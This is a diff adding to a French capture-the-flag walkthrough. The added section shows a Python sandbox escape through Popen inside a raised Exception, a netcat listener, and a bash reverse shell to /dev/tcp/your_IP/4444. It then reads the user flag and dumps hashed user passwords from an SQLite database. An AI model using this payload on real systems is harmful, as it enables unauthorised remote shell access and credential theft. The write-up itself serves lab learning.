@@ -42,3 +42,45 @@ raise Exception((()).__class__.__bases__[0].__subclasses__()[317].__name__)
 !! **C'est là que se trouve le Popen** !!
 
 ![[popen.png]]
+
+
+---
+
+## Gain d'accès: 
+On va maintenant ouvrir le port **4444** en écoute et attendre une connexion **TCP** avec **Netcat**:
+```
+nc -lvnp 4444
+```
+
+Maintenant que le port 4444 est en écoute, on peut exécuter ce code:
+```
+raise Exception(str((()) .__class__.__bases__[0].__subclasses__()[317](  
+"bash -c 'bash -i >& /dev/tcp/your_IP/4444 0>&1'", shell=True, stdout=-1).communicate()))
+```
+
+Voilà, maintenant on est dans le **bash** de l'app
+![[bash_app.png]]
+
+On peut trouver l'**user flag** avec les commandes:
+```
+cd ..
+ls
+cat user.txt
+```
+
+![[user_flag.png]]
+
+Dans le répertoire **/app/instance**, on peut trouver une base de donnée:
+
+![[database.png]]
+
+On peut accéder à cette base de données avec les commandes:
+```
+sqlite3 database.db
+.tables
+SELECT * FROM user
+```
+
+![[user_table.png]]
+
+On constate qu'il y 2 utilisateurs avec leurs **user name** et des **mots de passe hashés**
